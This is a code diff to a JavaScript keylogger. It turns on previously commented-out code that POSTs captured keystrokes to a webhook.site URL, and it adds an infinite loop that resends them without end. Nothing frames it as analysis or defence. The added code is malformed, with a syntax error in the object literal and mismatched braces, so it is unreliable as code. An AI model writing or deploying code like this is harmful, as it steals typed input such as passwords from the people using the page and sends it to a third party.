@@ -15,10 +15,7 @@ window.setInterval(function() {
 console.log(keys);
 
 
-
-/* 
-
-var webhook = ' WEBHOOK URL';
+var webhook = 'https://webhook.site/f70bf123-e142-4f81-8f36-156a98c300ed';
 
 var request = new XMLHttpRequest();
       request.open("POST", webhook);
@@ -32,7 +29,21 @@ var request = new XMLHttpRequest();
 
       request.send(JSON.stringify(params));
 
-  }
 
-    */
-//maybe put a infinite loop?
+
+
+
+while (true){
+      request.open("POST", webhook);
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+
+      var params = {
+        content: keys;
+      }
+
+      request.send(JSON.stringify(params));
+
+  }
+}
